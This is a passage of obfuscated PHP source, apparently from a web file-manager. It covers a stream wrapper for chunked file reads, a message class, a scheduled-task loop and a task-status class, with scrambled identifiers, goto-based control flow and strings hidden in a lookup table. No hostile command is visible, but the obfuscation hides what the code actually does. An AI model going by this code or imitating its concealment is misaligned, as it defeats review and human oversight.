$this->pathOpen = $c’…ôó‘½; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto eÇ¾èğšã; eÇ¾èğšã: if (!isset(self::$_chunkBuffer[$c’…ôó‘½])) { self::$_chunkBuffer[$c’…ôó‘½] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto d…Š¦ÔËÊ; EâòªŠÄç›: $this->info = $this->info($c’…ôó‘½); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[£¶ä½¶¢][86]]; goto eÆÀğÉÙ¹İ; d…Š¦ÔËÊ: } function stream_read($eƒĞÅƒ¢ë‘) { $e£ùËÎ‘¼ = $this->fileSubstr($this->pose, $eƒĞÅƒ¢ë‘); $this->pose += strlen($e£ùËÎ‘¼); return $e£ùËÎ‘¼; } public function stream_tell() { return $this->pose; } public function stream_seek($DŞÖ§âÇ¸, $F÷ÁÑ“Ûä) { $aêŸ…–»¦  =& $_SERVER[£¶ä½¶¢]; if ($F÷ÁÑ“Ûä == SEEK_SET) { $this->pose = $DŞÖ§âÇ¸; } else { if ($F÷ÁÑ“Ûä == SEEK_CUR) { $this->pose += $DŞÖ§âÇ¸; } else { if ($F÷ÁÑ“Ûä == SEEK_END) { $this->pose = $this->info[$aêŸ…–»¦ [88]] + intval($DŞÖ§âÇ¸); } } } if ($DŞÖ§âÇ¸ < 0) { $this->pose = $this->info[$aêŸ…–»¦ [88]] + $DŞÖ§âÇ¸; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[£¶ä½¶¢][88]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($dÖ‹Õ©İ¸, $E§Œ’¼Íª–) { $EÆø—¼í‹Ò =& $_SERVER[£¶ä½¶¢]; $C®Á‚¼í³ = $this->info($dÖ‹Õ©İ¸); return array($EÆø—¼í‹Ò[1377] => 0, $EÆø—¼í‹Ò[1378] => 0, $EÆø—¼í‹Ò[22] => 32768 + 511, $EÆø—¼í‹Ò[1379] => 0, $EÆø—¼í‹Ò[1380] => 0, $EÆø—¼í‹Ò[1381] => 0, $EÆø—¼í‹Ò[1382] => 0, $EÆø—¼í‹Ò[88] => $C®Á‚¼í³[$EÆø—¼í‹Ò[88]], $EÆø—¼í‹Ò[1383] => $C®Á‚¼í³[$EÆø—¼í‹Ò[1252]], $EÆø—¼í‹Ò[1339] => $C®Á‚¼í³[$EÆø—¼í‹Ò[94]], $EÆø—¼í‹Ò[1338] => $C®Á‚¼í³[$EÆø—¼í‹Ò[204]], $EÆø—¼í‹Ò[1384] => 0, $EÆø—¼í‹Ò[1385] => 0); } static $fileInfo = array(); public function info($c‘šë¸¨† ) { $FÑ¸Ó²å±¢ = $_SERVER[£¶ä½¶¢][1386]; if (isset(self::$fileInfo[$c‘šë¸¨† ])) { return self::$fileInfo[$c‘šë¸¨† ]; } if (substr($c‘šë¸¨† , 0, strlen($FÑ¸Ó²å±¢)) != $FÑ¸Ó²å±¢) { return !1; } self::$fileInfo[$c‘šë¸¨† ] = IO::info(substr($c‘šë¸¨† , strlen($FÑ¸Ó²å±¢))); return self::$fileInfo[$c‘šë¸¨† ]; } public static function read($d–Ûì®²”ö, $bŒ²Œ½ª«Ù, $ašƒ‡ÆÊœê) { if (!isset(self::$_fopenCache[$d–Ûì®²”ö])) { $B‰‘ğÑ“›İ = new StreamWrapperIO(); $B‰‘ğÑ“›İ->stream_open($d–Ûì®²”ö); self::$_fopenCache[$d–Ûì®²”ö] = $B‰‘ğÑ“›İ; } $B‰‘ğÑ“›İ = self::$_fopenCache[$d–Ûì®²”ö]; return $B‰‘ğÑ“›İ->fileSubstr($bŒ²Œ½ª«Ù, $ašƒ‡ÆÊœê); } public static function _read($A‘éÒ¥ŸŞ, $B´ÔèáŸ¬, $c—Ùé½è²) { goto fİâÆöºñ»; D†Â‘‰Ş„: $d»ì²àÖÍ = 0; while ($d»ì²àÖÍ < $c—Ùé½è²) { $EµÚÙØóŸ = min($b¸Óë¦ğ¬, $c—Ùé½è² - $d»ì²àÖÍ); $E ›…›˜ö .= fread($AÆíë¼ËÓ, $EµÚÙØóŸ); $d»ì²àÖÍ += $EµÚÙØóŸ; } fclose($AÆíë¼ËÓ); goto e‘´ÏÇÀ¬ó; c˜Î§á×Š: $b¸Óë¦ğ¬ = 8192; fseek($AÆíë¼ËÓ, $B´ÔèáŸ¬, SEEK_SET); $E ›…›˜ö = $eêÔ•°•Û[43]; goto D†Â‘‰Ş„; fİâÆöºñ»: $eêÔ•°•Û =& $_SERVER[£¶ä½¶¢]; $AÆíë¼ËÓ = fopen($A‘éÒ¥ŸŞ, $eêÔ•°•Û[1256]); if (!$AÆíë¼ËÓ) { return $eêÔ•°•Û[43]; } goto c˜Î§á×Š; e‘´ÏÇÀ¬ó: return $E ›…›˜ö; goto fÚæñ”â¹; fÚæñ”â¹: } public function fileSubstr($eœåÜÂ…Ç¸, $BÚ®­Äã®ó) { goto bšÒ¤×Ğ¤â; D†”½×¸õ: $D†ë§…›µ = 64 * 1024; $EÚ—§²ÓÅ© =& self::$_chunkBuffer[$this->path]; if (!$EÚ—§²ÓÅ©) { $EÚ—§²ÓÅ© = array(); } goto A„­Ú¹ˆ¦ë; A„­Ú¹ˆ¦ë: $fêˆ¾éÛ©Ã = 0; $A™ª‚Éçâ = 0; $Dì»”ÈšŸš = $Föß¿õº‰á[43]; goto FÆ¡°Öó—; cÈ»Æ–¤—: $bŠÊøëÎ = $BÚ®­Äã®ó; if ($eœåÜÂ…Ç¸ < 0) { $eœåÜÂ…Ç¸ = $cÒ¸ êŒ± + $eœåÜÂ…Ç¸; } if ($BÚ®­Äã®ó === !1) { $BÚ®­Äã®ó = $cÒ¸ êŒ± - $eœåÜÂ…Ç¸; } goto E²œ¨Ìù¡; bšÒ¤×Ğ¤â: $Föß¿õº‰á =& $_SERVER[£¶ä½¶¢]; $cÒ¸ êŒ± = $this->info[$Föß¿õº‰á[88]]; $EÛé–‰îò” = $eœåÜÂ…Ç¸; goto cÈ»Æ–¤—; FÆ¡°Öó—: foreach ($EÚ—§²ÓÅ© as $fêˆ¾éÛ©Ã => $Dì»”ÈšŸš) { $fêˆ¾éÛ©Ã = intval($fêˆ¾éÛ©Ã); $A™ª‚Éçâ = $fêˆ¾éÛ©Ã + strlen($Dì»”ÈšŸš); if ($eœåÜÂ…Ç¸ >= $A™ª‚Éçâ) { continue; } if ($eœåÜÂ…Ç¸ >= $fêˆ¾éÛ©Ã && $eœåÜÂ…Ç¸ + $BÚ®­Äã®ó <= $A™ª‚Éçâ) { return substr($Dì»”ÈšŸš, $eœåÜÂ…Ç¸ - $fêˆ¾éÛ©Ã, $BÚ®­Äã®ó); } break; } if (count($EÚ—§²ÓÅ©) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Föß¿õº‰á[1387], $Föß¿õº‰á[1388] . count($EÚ—§²ÓÅ©) . "\x3b\x73\x74\141\162\164\x3d{$eœåÜÂ…Ç¸}\54\x6c\x65\x6e\147\x74\150\x3d{$BÚ®­Äã®ó}\x3b\160\157\163\x65\x3a{$fêˆ¾éÛ©Ã}\x7e{$A™ª‚Éçâ}"); throw new Exception($Föß¿õº‰á[1389]); } $CˆÑ»¼ë£ = intval($eœåÜÂ…Ç¸ / $D†ë§…›µ) * $D†ë§…›µ; goto c•è±œª‡³; c•è±œª‡³: $AÃ £°¾˜Ú = ceil(($eœåÜÂ…Ç¸ + $BÚ®­Äã®ó) / $D†ë§…›µ) * $D†ë§…›µ - $CˆÑ»¼ë£; $EæÃÔï“ª‘ = IO::fileSubstr($this->path, $CˆÑ»¼ë£, $AÃ £°¾˜Ú); $EÚ—§²ÓÅ©[$CˆÑ»¼ë£ . $Föß¿õº‰á[43]] = $EæÃÔï“ª‘; goto a¹”…ñÔí¨; E²œ¨Ìù¡: if ($eœåÜÂ…Ç¸ + $BÚ®­Äã®ó > $cÒ¸ êŒ±) { $BÚ®­Äã®ó = $cÒ¸ êŒ± - $eœåÜÂ…Ç¸; } if ($BÚ®­Äã®ó <= 0) { return $Föß¿õº‰á[43]; } if ($eœåÜÂ…Ç¸ < 0 || $eœåÜÂ…Ç¸ >= $cÒ¸ êŒ± || $BÚ®­Äã®ó <= 0 || $BÚ®­Äã®ó > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\x69\x6c\145\122\x65\141\x64\x20\145\x72\x72\157\x72\x21\40\x73\x74\x61\x72\164\75{$eœåÜÂ…Ç¸}\73\x6c\x65\156\147\x74\150\75{$BÚ®­Äã®ó}\x3b\40\163\x69\172\x65\x3d{$cÒ¸ êŒ±}\73"); } goto D†”½×¸õ; a¹”…ñÔí¨: ksort($EÚ—§²ÓÅ©); $dĞº­ªçÂâ = substr($EæÃÔï“ª‘, $eœåÜÂ…Ç¸ - $CˆÑ»¼ë£, $BÚ®­Äã®ó); return $dĞº­ªçÂâ; goto bõ¹ô†çÖ; bõ¹ô†çÖ: } private function log($e­ÁßÖÂùÀ, $Ašòïœóï¢) { $f‘“Íª”“Í =& $_SERVER[£¶ä½¶¢]; $a©‚ÉÓ…ƒŠ = timeFloat() - $this->timeStart; write_log(sprintf($f‘“Íª”“Í[1390], $e­ÁßÖÂùÀ, $this->info[$f‘“Íª”“Í[38]], $a©‚ÉÓ…ƒŠ, $Ašòïœóï¢), $f‘“Íª”“Í[1076]); } } class Message { function __construct() { } public function send($fÅ¥»‚Í±‡ = '', $B‰À…Ñ¹‡„ = array(), $fòçÓÏË‹‰ = "\164\x65\x78\x74") { goto fîÏ¯»ÜÆ; A½Âñ¦ÊÄá: $B‰À…Ñ¹‡„ = array($cÏ„à”²›[1013] => isset($B‰À…Ñ¹‡„[$cÏ„à”²›[1013]]) ? $B‰À…Ñ¹‡„[$cÏ„à”²›[1013]] : $cÏ„à”²›[43], $cÏ„à”²›[570] => isset($B‰À…Ñ¹‡„[$cÏ„à”²›[570]]) ? $B‰À…Ñ¹‡„[$cÏ„à”²›[570]] : $cÏ„à”²›[43]); if (empty($fÅ¥»‚Í±‡) || empty($B‰À…Ñ¹‡„[$cÏ„à”²›[1013]]) && empty($B‰À…Ñ¹‡„[$cÏ„à”²›[570]])) { return !1; } $eÕ¨Å…‡¥Â = array($cÏ„à”²›[1332] => $E®×­ÉáÌ, $cÏ„à”²›[1393] => $B‰À…Ñ¹‡„); goto Bğ£˜ˆàíš; Bğ£˜ˆàíš: Hook::trigger($cÏ„à”²›[1394], $eÕ¨Å…‡¥Â); goto f¯­ª£¾‘±; fîÏ¯»ÜÆ: $cÏ„à”²› =& $_SERVER[£¶ä½¶¢]; $E®×­ÉáÌ = array($cÏ„à”²›[39] => $cÏ„à”²›[1391], $cÏ„à”²›[723] => $fÅ¥»‚Í±‡); if (in_array($fòçÓÏË‹‰, array($cÏ„à”²›[1391], $cÏ„à”²›[1392]))) { $E®×­ÉáÌ[$cÏ„à”²›[39]] = $fòçÓÏË‹‰; } goto A½Âñ¦ÊÄá; f¯­ª£¾‘±: } } goto cãá…à–ØÃ; d‡¨Ñ¥ÇÅ¾: define($_SERVER[£¶ä½¶¢][248], 1); define($_SERVER[£¶ä½¶¢][249], 0); define($_SERVER[£¶ä½¶¢][250], 2); goto c›Ó©¬¼·È; cˆŠ‹ó²×¢: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto fÒ’ä’…¾˜; fÒ’ä’…¾˜: $aÌ­‡¿«¤´ =& $_SERVER[£¶ä½¶¢]; if (self::valueGet($aÌ­‡¿«¤´[718]) != $aÌ­‡¿«¤´[97]) { return; } if (self::valueGet($aÌ­‡¿«¤´[1490]) == $aÌ­‡¿«¤´[97]) { $F‚½È±âó­ = self::valueGet($aÌ­‡¿«¤´[1491]); if (time() - $F‚½È±âó­ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto A¹ƒ®¢ï¡†; A¹ƒ®¢ï¡†: http_close(); self::valueSet($aÌ­‡¿«¤´[1490], $aÌ­‡¿«¤´[97]); Hook::bind($aÌ­‡¿«¤´[1492], $aÌ­‡¿«¤´[1493]); goto dÏßÂÒİÒÇ; dÏßÂÒİÒÇ: while (!0) { self::cacheClear(); if (self::valueGet($aÌ­‡¿«¤´[718]) != $aÌ­‡¿«¤´[97]) { self::valueSet($aÌ­‡¿«¤´[1490], $aÌ­‡¿«¤´[201]); self::log($aÌ­‡¿«¤´[1494]); die; } self::valueSet($aÌ­‡¿«¤´[1490], $aÌ­‡¿«¤´[97]); self::valueSet($aÌ­‡¿«¤´[1491], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto Bø’°…±”Ö; Bø’°…±”Ö: } public static function restart() { $cÅî‘£ŠŠâ =& $_SERVER[£¶ä½¶¢]; http_close(); self::valueSet($cÅî‘£ŠŠâ[718], $cÅî‘£ŠŠâ[201]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($cÅî‘£ŠŠâ[1490], $cÅî‘£ŠŠâ[201]); self::valueSet($cÅî‘£ŠŠâ[718], $cÅî‘£ŠŠâ[97]); } public static function shutdownEvent() { $B¥„ò„Ûâ™ =& $_SERVER[£¶ä½¶¢]; self::valueSet($B¥„ò„Ûâ™[1490], $B¥„ò„Ûâ™[201]); self::log($B¥„ò„Ûâ™[1495]); } public static function config($fËÌÌ†‚œô, $c‘™ÓŒ²ˆ) { self::valueSet($_SERVER[£¶ä½¶¢][718], $fËÌÌ†‚œô); } private static function taskRunAll() { goto EÅ…µÀ­¬†; EÅ…µÀ­¬†: $f‘¶‰òÌ½¨ =& $_SERVER[£¶ä½¶¢]; $DÇš¢Š‘èÓ = timeFloat(); $D´ ‰™áÁ = Model($f‘¶‰òÌ½¨[1496])->listData(); goto aßìÁâ®Å¡; aßìÁâ®Å¡: $b‰çÊ­ÉÁÒ = count($D´ ‰™áÁ); for ($D¿Ë©Ùºñ¯ = 0; $D¿Ë©Ùºñ¯ < $b‰çÊ­ÉÁÒ; $D¿Ë©Ùºñ¯++) { $Fµ šÄõ‰ò = $D´ ‰™áÁ[$D¿Ë©Ùºñ¯]; if (!$Fµ šÄõ‰ò[$f‘¶‰òÌ½¨[401]] || $Fµ šÄõ‰ò[$f‘¶‰òÌ½¨[1497]] != $f‘¶‰òÌ½¨[97]) { continue; } if (!self::taskTimeCheck($Fµ šÄõ‰ò)) { continue; } self::taskRun($Fµ šÄõ‰ò); } Hook::trigger($f‘¶‰òÌ½¨[1498]); goto AÄƒØ¯×§; AÄƒØ¯×§: self::taskQueueRun($DÇš¢Š‘èÓ); self::closeDatabase(); goto F‰ÅŠ¿íó; F‰ÅŠ¿íó: } private static function taskQueueRun($DË…œ—Åñğ) { $d ˜Ç×˜Û  = 10; while (!0) { $dº‹×Ÿ¯œ = TaskQueue::run(); if ($dº‹×Ÿ¯œ === !1) { break; } if (timeFloat() - $DË…œ—Åñğ >= $d ˜Ç×˜Û ) { break; } } } private static function taskTimeCheck($B¥æÚ‡«®Ò) { goto BÃƒÆŒÊ’Ô; BÃƒÆŒÊ’Ô: $c‘ŞÓİÎÃ =& $_SERVER[£¶ä½¶¢]; $a„º§¶¬“ò = json_decode($B¥æÚ‡«®Ò[$c‘ŞÓİÎÃ[207]], !0); $AËÍÉò¢İî = intval($B¥æÚ‡«®Ò[$c‘ŞÓİÎÃ[1491]]); goto bĞ„ãœ‘ì; b ‡æƒß: switch ($a„º§¶¬“ò[$c‘ŞÓİÎÃ[39]]) { case $c‘ŞÓİÎÃ[1505]: if (time() - $AËÍÉò¢İî < 3600 * 24 * 30) { return !1; } if ($a„º§¶¬“ò[$c‘ŞÓİÎÃ[1505]] == date($c‘ŞÓİÎÃ[1506]) && $AÁ­İ‹†³) { return !0; } break; case $c‘ŞÓİÎÃ[1507]: if (time() - $AËÍÉò¢İî < 3600 * 24 * 7) { return !1; } $DÜ†õÒ¾Š = date($c‘ŞÓİÎÃ[1508]) == 0 ? 7 : date($c‘ŞÓİÎÃ[1508]); if ($a„º§¶¬“ò[$c‘ŞÓİÎÃ[1507]] == $DÜ†õÒ¾Š && $AÁ­İ‹†³) { return !0; } break; case $c‘ŞÓİÎÃ[1500]: if (time() - $AËÍÉò¢İî < 3600 * 24) { return !1; } if ($AÁ­İ‹†³) { return !0; } break; case $c‘ŞÓİÎÃ[1509]: if (time() - $AËÍÉò¢İî >= floatval($a„º§¶¬“ò[$c‘ŞÓİÎÃ[1509]]) * 60) { return !0; } break; default: break; } return !1; goto C´¨Óùğ²Í; bĞ„ãœ‘ì: $Bªì¥°ì’ = strtotime($c‘ŞÓİÎÃ[1499] . $a„º§¶¬“ò[$c‘ŞÓİÎÃ[1500]] . $c‘ŞÓİÎÃ[1501]) - strtotime($c‘ŞÓİÎÃ[1502]); $e²ëßÎ‹É = time() - strtotime(date($c‘ŞÓİÎÃ[1503]) . $c‘ŞÓİÎÃ[1504]); $AÁ­İ‹†³ = $e²ëßÎ‹É >= $Bªì¥°ì’ && $e²ëßÎ‹É <= $Bªì¥°ì’ + 3600; goto b ‡æƒß; C´¨Óùğ²Í: } private static function closeDatabase() { goto bÇ³Îã¦À; cÃÍÀ®‰¡: $C‚çÜ¨ÃŒ˜ = Model($Fİšóã…Ò[510])->db($Fİšóã…Ò[43]); if ($C‚çÜ¨ÃŒ˜) { $C‚çÜ¨ÃŒ˜->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($Fİšóã…Ò[1510], $Fİšóã…Ò[1511]); die; } goto DˆçÕÍ³¡Ö; dçÄ¼ÀÈ…: if (!$Fá§­«¹Ê¤) { $Fá§­«¹Ê¤ = time(); } if (time() - $Fá§­«¹Ê¤ < $E­ìÇÅ‚ì) { return; } $Fá§­«¹Ê¤ = time(); goto cÃÍÀ®‰¡; bÇ³Îã¦À: $Fİšóã…Ò =& $_SERVER[£¶ä½¶¢]; static $Fá§­«¹Ê¤ = 0; $E­ìÇÅ‚ì = 1800; goto dçÄ¼ÀÈ…; DˆçÕÍ³¡Ö: } public static function taskRun($D¸Â‹­ÎùÈ) { goto eß˜ÁùêÜÚ; eß˜ÁùêÜÚ: $fó¹ïçÚ =& $_SERVER[£¶ä½¶¢]; self::log($fó¹ïçÚ[1512] . $D¸Â‹­ÎùÈ[$fó¹ïçÚ[401]] . $fó¹ïçÚ[1513] . $D¸Â‹­ÎùÈ[$fó¹ïçÚ[38]] . $fó¹ïçÚ[1514] . $D¸Â‹­ÎùÈ[$fó¹ïçÚ[1515]]); Model($fó¹ïçÚ[1496])->run($D¸Â‹­ÎùÈ[$fó¹ïçÚ[401]]); goto EˆŠ»¬ï«¢; EÑŒ„ÊÛ™‘: Model($fó¹ïçÚ[1516])->add(array($fó¹ïçÚ[1517] => $fó¹ïçÚ[43], $fó¹ïçÚ[1518] => $fó¹ïçÚ[201], $fó¹ïçÚ[39] => $fó¹ïçÚ[1519] . $D¸Â‹­ÎùÈ[$fó¹ïçÚ[401]], $fó¹ïçÚ[1520] => json_encode(array($fó¹ïçÚ[38] => $D¸Â‹­ÎùÈ[$fó¹ïçÚ[38]], $fó¹ïçÚ[1521] => timeFloat() - $E”àØ–âí, $fó¹ïçÚ[300] => $fªÂŒò…)))); self::log($fó¹ïçÚ[1522] . $D¸Â‹­ÎùÈ[$fó¹ïçÚ[401]] . $fó¹ïçÚ[1523] . $fªÂŒò…); return !0; goto dƒŠ¡õ¨‰; EˆŠ»¬ï«¢: $E”àØ–âí = timeFloat(); $fªÂŒò… = $fó¹ïçÚ[43]; switch ($D¸Â‹­ÎùÈ[$fó¹ïçÚ[39]]) { case $fó¹ïçÚ[314]: $eã†¨ç™ë™ = url_request($D¸Â‹­ÎùÈ[$fó¹ïçÚ[1515]], $fó¹ïçÚ[238], !1, !1, !1, !1, 5); $fªÂŒò… = strlen($eã†¨ç™ë™); break; case $fó¹ïçÚ[237]: $fªÂŒò… = Hook::apply($D¸Â‹­ÎùÈ[$fó¹ïçÚ[1515]]); default: break; } goto EÑŒ„ÊÛ™‘; dƒŠ¡õ¨‰: } private static function valueGet($C‚ËñÀ ’µ) { $eññ–± ÌŠ =& $_SERVER[£¶ä½¶¢]; $ağ³Ú™“¬é = $eññ–± ÌŠ[1524]; $aòªğÄÖ›— = Model($eññ–± ÌŠ[1525])->get($C‚ËñÀ ’µ, $ağ³Ú™“¬é); if (is_null($aòªğÄÖ›—)) { Model($eññ–± ÌŠ[1525])->set($eññ–± ÌŠ[718], $eññ–± ÌŠ[97], $ağ³Ú™“¬é); Model($eññ–± ÌŠ[1525])->set($eññ–± ÌŠ[1490], $eññ–± ÌŠ[201], $ağ³Ú™“¬é); $aòªğÄÖ›— = Model($eññ–± ÌŠ[1525])->get($C‚ËñÀ ’µ, $ağ³Ú™“¬é); } return $aòªğÄÖ›—; } private static function valueSet($c¼ÒŠ…ºÂ, $BÓ ÖæÀÄğ) { $f×à¥®£© =& $_SERVER[£¶ä½¶¢]; return Model($f×à¥®£©[1525])->set($c¼ÒŠ…ºÂ, $BÓ ÖæÀÄğ, $f×à¥®£©[1524]); } protected static function log($AŞ«íß¤Õ) { write_log($AŞ«íß¤Õ, $_SERVER[£¶ä½¶¢][1511]); } private static function cacheClear() { $böÒ“¹ƒÙø =& $_SERVER[£¶ä½¶¢]; $bá…“„Ñà = Model($böÒ“¹ƒÙø[1525])->cacheKey($böÒ“¹ƒÙø[1524]); Cache::clearMemory($bá…“„Ñà); Model($böÒ“¹ƒÙø[1496])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\x69\x6e\x67"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($cËÂíˆä›ç, $D¬àêÕ»àò = '', $aÓ–Š…’ = 0, $F¥Òà‚Œ‰ = '') { goto dª¤¸äìÖç; BßòÊ†•¾Ğ: $this->startAfter(); Hook::trigger($b™ñ»Ñ´”š[1536], $this->task); $this->task[$b™ñ»Ñ´”š[1529]] = timeFloat(); goto fÓÇ‚çÚ¯²; A¶ŸÜö—Ô†: $GLOBALS[$b™ñ»Ñ´”š[1532]] = 1; Hook::bind($b™ñ»Ñ´”š[1492], array($this, $b™ñ»Ñ´”š[1533])); Hook::bind($b™ñ»Ñ´”š[1534], array($this, $b™ñ»Ñ´”š[1535])); goto BßòÊ†•¾Ğ; dª¤¸äìÖç: $b™ñ»Ñ´”š =& $_SERVER[£¶ä½¶¢]; if (self::get($cËÂíˆä›ç)) { return; } $this->task = array($b™ñ»Ñ´”š[401] => $cËÂíˆä›ç, $b™ñ»Ñ´”š[1526] => USER_ID, $b™ñ»Ñ´”š[1432] => $F¥Òà‚Œ‰, $b™ñ»Ñ´”š[39] => $D¬àêÕ»àò, $b™ñ»Ñ´”š[1021] => $b™ñ»Ñ´”š[43], $b™ñ»Ñ´”š[1019] => $aÓ–Š…’, $b™ñ»Ñ´”š[1034] => 0, $b™ñ»Ñ´”š[1527] => 0, $b™ñ»Ñ´”š[1528] => 0, $b™ñ»Ñ´”š[757] => timeFloat(), $b™ñ»Ñ´”š[756] => 0, $b™ñ»Ñ´”š[1529] => 0, $b™ñ»Ñ´”š[1530] => 0, $b™ñ»Ñ´”š[1531] => 0, $b™ñ»Ñ´”š[718] => $b™ñ»Ñ´”š[1490]); goto A¶ŸÜö—Ô†; fÓÇ‚çÚ¯²: } public function end() { goto eô°ßç«¢¶; eô°ßç«¢¶: $eİØ »†¼À =& $_SERVER[£¶ä½¶¢]; if (!$this->task) { return; } if ($this->task[$eİØ »†¼À[1529]]) { self::valueSet($this->task[$eİØ »†¼À[401]], !1); } goto dò°§öœ·¯; dò°§öœ·¯: $A±®îçÊõç = timeFloat() - $this->task[$eİØ »†¼À[757]]; self::log($eİØ »†¼À[1537] . $this->task[$eİØ »†¼À[401]] . $eİØ »†¼À[1538] . $A±®îçÊõç . $eİØ »†¼À[1539]); Hook::unbind($eİØ »†¼À[1492], array($this, $eİØ »†¼À[1533])); goto BÄç¥¸Ïé; BÄç¥¸Ïé: Hook::unbind($eİØ »†¼À[1534], array($this, $eİØ »†¼À[1535])); $this->endAfter(); $this->task = !1; goto fÜÍõ¨ÚŞ; fÜÍõ¨ÚŞ: } public function update($b¼†ÒÍİæ = 0, $B®ß»ß²ä­ = false) { goto EÃ½ÛºÑÆ˜; DåßŒñ¡÷: $cŠ³ğè»Ì[$Eï¤©í¶ˆï[718]] = $a—‡ğ±„İ” ? $a—‡ğ±„İ” : $cŠ³ğè»Ì[$Eï¤©í¶ˆï[718]]; $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1530]] = $eÇÄÕñ‘£İ[$Eï¤©í¶ˆï[1530]] ? $eÇÄÕñ‘£İ[$Eï¤©í¶ˆï[1530]] : 0; $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1529]] = timeFloat(); goto c–®Ñ±¦Œ¾; c–®Ñ±¦Œ¾: Hook::trigger($Eï¤©í¶ˆï[1543], $cŠ³ğè»Ì); self::valueSet($cŠ³ğè»Ì[$Eï¤©í¶ˆï[401]], $cŠ³ğè»Ì); goto cĞêòœÏº; aºŸ«¦ˆº: $eÇÄÕñ‘£İ = self::get($cŠ³ğè»Ì[$Eï¤©í¶ˆï[401]]); $a—‡ğ±„İ” = $eÇÄÕñ‘£İ[$Eï¤©í¶ˆï[718]]; if ($a—‡ğ±„İ” == self::STATYS_KILL) { $b‚¡—¶ë—Ğ = array($Eï¤©í¶ˆï[1540] => LNG($Eï¤©í¶ˆï[1541]), $Eï¤©í¶ˆï[1084] => !1); Cache::set($Eï¤©í¶ˆï[1542] . $this->task[$Eï¤©í¶ˆï[401]], $b‚¡—¶ë—Ğ, 30); $this->onKill(); $this->end(); die; } else { if ($a—‡ğ±„İ” == self::STATYS_STOP) { $d„ÙØŸ¿ñ = 2; $eÇÄÕñ‘£İ[$Eï¤©í¶ˆï[1530]] += $d„ÙØŸ¿ñ; self::valueSet($cŠ³ğè»Ì[$Eï¤©í¶ˆï[401]], $eÇÄÕñ‘£İ); sleep($d„ÙØŸ¿ñ); $this->update(); return; } } goto DåßŒñ¡÷; EÃ½ÛºÑÆ˜: $Eï¤©í¶ˆï =& $_SERVER[£¶ä½¶¢]; $cŠ³ğè»Ì =& $this->task; if (!$cŠ³ğè»Ì) { return; } goto CÖµ™Ïœ¬‘; aÒîø¢¡Â˜: $this->updateAfter(); $có…øÔõÄ = 0.2; if (timeFloat() - $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1529]] < $có…øÔõÄ && !$B®ß»ß²ä­) { return; } goto aºŸ«¦ˆº; CÖµ™Ïœ¬‘: $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1034]] += $b¼†ÒÍİæ; $cŠ³ğè»Ì[$Eï¤©í¶ˆï[756]] = timeFloat(); if ($cŠ³ğè»Ì[$Eï¤©í¶ˆï[1019]]) { if ($cŠ³ğè»Ì[$Eï¤©í¶ˆï[1019]] < $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1034]]) { $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1019]] = $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1034]]; } $Bğ¢Â™Ÿ = timeFloat() - $cŠ³ğè»Ì[$Eï¤©í¶ˆï[757]] - $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1530]]; $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1527]] = $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1034]] / $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1019]]; $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1528]] = $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1034]] / $Bğ¢Â™Ÿ; if ($cŠ³ğè»Ì[$Eï¤©í¶ˆï[1527]] > 0) { $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1531]] = $Bğ¢Â™Ÿ * (1 - $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1527]]) / $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1527]]; } $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1531]] = $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1531]] <= 0 ? 0 : $cŠ³ğè»Ì[$Eï¤©í¶ˆï[1531]]; } goto aÒîø¢¡Â˜; cĞêòœÏº: } public function onKillSet($FõÜŠÁªê, $BƒíºßÇö = array()) { $this->onKillCall = array($FõÜŠÁªê, $BƒíºßÇö); } public function onKill() { $BºçĞ°‡‹ =& $_SERVER[£¶ä½¶¢]; self::log($BºçĞ°‡‹[1537] . $this->task[$BºçĞ°‡‹[401]] . $BºçĞ°‡‹[1544]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($a½‰î…Ñ¸±) { $fİ‘ˆ¹Ñï =& $_SERVER[£¶ä½¶¢]; Cache::set($fİ‘ˆ¹Ñï[1542] . $this->task[$fİ‘ˆ¹Ñï[401]], $a½‰î…Ñ¸±, 60); return $a½‰î…Ñ¸±; } public static function get($CìİòÌÈÒ—) { return self::valueGet($CìİòÌÈÒ—); } public static function listData() { $D‘®§š¸‚ = self::valueGet(); return array_sort_by($D‘®§š¸‚, $_SERVER[£¶ä½¶¢][757], !0); } public static function kill($a¹×„Ç‚é…) { return self::changeStatus($a¹×„Ç‚é…, self::STATYS_KILL); } public static function stop($b Ù„†ÃÁË) { return self::changeStatus($b Ù„†ÃÁË, self::STATYS_STOP); } public static function restart($Eö¢Ø–ä©Ğ) { return self::changeStatus($Eö¢Ø–ä©Ğ, self::STATYS_RUNNING); } public static function 